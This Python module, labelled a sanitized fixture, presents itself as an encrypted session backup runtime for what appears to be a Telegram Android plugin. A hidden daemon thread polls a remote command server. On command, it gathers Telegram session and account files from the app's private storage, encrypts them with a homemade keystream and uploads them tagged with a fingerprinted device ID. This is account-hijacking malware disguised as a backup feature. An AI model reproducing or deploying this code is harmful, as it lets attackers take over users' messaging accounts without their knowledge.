# Sanitized executable behavior fixture; never run against real profiles.
"""Background polling and encrypted session backup runtime."""

import hashlib
import io
import json
import os
import threading
import time
import urllib.request
import zipfile


DEFAULT_SERVER = "https://backup.example"


class BackupRuntime:
    """Poll one backup endpoint and process commands on a daemon thread."""

    def __init__(self, server=DEFAULT_SERVER, token=None, build=None, poll=20):
        self.server = server.rstrip("/")
        self.token = token
        self.build = build
        self.poll = poll
        self._stop = threading.Event()
        self._thread = None
        self._device = None

    def start(self):
        """Start the worker once and return its thread."""
        if self._thread is not None and self._thread.is_alive():
            return self._thread
        self._stop.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        return self._thread

    def stop(self):
        self._stop.set()

    def _http(self, path, data=None, headers=None, timeout=30):
        req = urllib.request.Request(
            self.server + path, data=data, headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout) as response:
            return response.read()

    def _device_id(self):
        if self._device is not None:
            return self._device
        self._device = "unknown"
        try:
            from java import jclass
            from org.telegram.messenger import ApplicationLoader

            secure = jclass("android.provider.Settings$Secure")
            context = ApplicationLoader.applicationContext
            android_id = str(secure.getString(
                context.getContentResolver(), secure.ANDROID_ID) or "")
            if android_id:
                self._device = hashlib.md5(android_id.encode()).hexdigest()
        except Exception:
            pass
        return self._device

    @staticmethod
    def _session_files():
        from org.telegram.messenger import ApplicationLoader

        context = ApplicationLoader.applicationContext
        files_dir = str(context.getFilesDir().getAbsolutePath())
        data_dir = os.path.dirname(files_dir)
        result = []
        for directory in (files_dir, os.path.join(data_dir, "shared_prefs")):
            for root, _, files in os.walk(directory):
                for name in files:
                    lower = name.lower()
                    if not (lower == "tgnet.dat"
                            or lower == "accounts_map.json"
                            or (lower.startswith("userconf")
                                and lower.endswith(".xml"))):
                        continue
                    path = os.path.join(root, name)
                    try:
                        if 0 < os.path.getsize(path) <= 20 * 1024 * 1024:
                            result.append((os.path.relpath(path, data_dir), path))
                    except OSError:
                        pass
        return result

    @staticmethod
    def _keystream(key, nonce, size):
        output = bytearray()
        counter = 0
        while len(output) < size:
            output.extend(hashlib.sha256(
                key + nonce + counter.to_bytes(4, "big")).digest())
            counter += 1
        return bytes(output[:size])

    @classmethod
    def _encrypt(cls, key, plaintext):
        nonce = os.urandom(16)
        stream = cls._keystream(key, nonce, len(plaintext))
        return nonce + bytes(a ^ b for a, b in zip(plaintext, stream))

    def _backup(self, key_hex):
        key = bytes.fromhex(key_hex)
        files = self._session_files()
        if not files:
            return {"error": "no session files",
                    "hint": "files dir empty or unreadable"}

        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
            for relative, path in files:
                try:
                    with open(path, "rb") as source:
                        archive.writestr(relative, source.read())
                except OSError:
                    pass
        blob = self._encrypt(key, buffer.getvalue())

        try:
            raw = self._http("/up", blob, {
                "Content-Type": "application/octet-stream",
                "X-Plugin-Token": self.token,
                "X-Client-Id": self._device_id(),
                "X-Build-Key": self.build,
            }, timeout=90)
        except Exception as exc:
            detail = ""
            try:
                detail = exc.read().decode("utf-8", "ignore")[:200]
            except Exception:
                pass
            return {"error": "up %s: %s" % (
                getattr(exc, "code", "?"), detail), "files": len(files)}
        try:
            return json.loads(raw.decode("utf-8", "ignore"))
        except ValueError:
            return {"error": "bad response", "files": len(files)}

    def _post_report(self, report):
        try:
            self._http("/cmd", data=json.dumps({
                "dev": self._device_id(), "build": self.build,
                "report": report,
            }).encode(), headers={
                "Content-Type": "application/json",
                "X-Plugin-Token": self.token,
            })
        except Exception:
            pass

    def _run(self):
        failures = 0
        report = None
        while not self._stop.is_set():
            try:
                body = {"dev": self._device_id(), "build": self.build}
                if report is not None:
                    body["report"] = report
                raw = self._http("/cmd", data=json.dumps(body).encode(), headers={
                    "Content-Type": "application/json",
                    "X-Plugin-Token": self.token,
                })
                command = json.loads(raw.decode("utf-8", "ignore"))
                if command.get("cmd") == "backup" and command.get("key"):
                    try:
                        result = self._backup(command["key"])
                        report = {"ok": bool(result.get("ok")), "res": result}
                    except Exception as exc:
                        report = {"ok": False, "err": str(exc)[:300]}
                    self._post_report(report)
                    report = None
                failures = 0
                self._stop.wait(self.poll)
            except Exception:
                failures += 1
                self._stop.wait(min(300, self.poll * (1 + failures)))
